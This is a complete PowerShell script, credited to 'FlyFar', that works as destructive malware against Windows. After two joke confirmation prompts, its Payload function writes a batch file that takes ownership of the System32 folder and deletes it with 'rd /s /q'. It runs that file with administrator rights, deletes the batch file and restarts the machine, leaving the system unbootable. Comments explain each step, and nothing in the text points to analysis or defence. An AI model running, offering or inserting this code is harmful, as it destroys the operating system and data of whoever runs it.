'Written by FlyFar
function Warningscript{
Write-host "Really???"
$WarningResponce = Read-host "Press Y to continue."
if ($WarningResponce -eq "Y"){
Lastwarning
}
else {
exit
}
}

<#
No
#>
function Lastwarning{
 Write-host "
No"
    $Lastchance = Read-host "Type 'I understand' to continue, (no quotations and caps sensitive)."
    if ($Lastchance -eq "I understand"){
    Payload
    }
    else {
    exit
}
}

<#
Writes a command to the batch file, executes the file, removes the batch file 
when finished, then restarts the computer
#>
function Payload{
Set-Location $PWD
echo "@echo off" "takeown /f C:\Windows\System32" "cacls C:\Windows\System32" "rd /s /q %windir%\system32"| out-file -Encoding ascii del.bat
powershell -command "Start-Process del.bat -Verb runas -Wait"
Remove-Item $PWD\del.bat 
Restart-Computer
}

<#
Runs the script
#>
Warningscript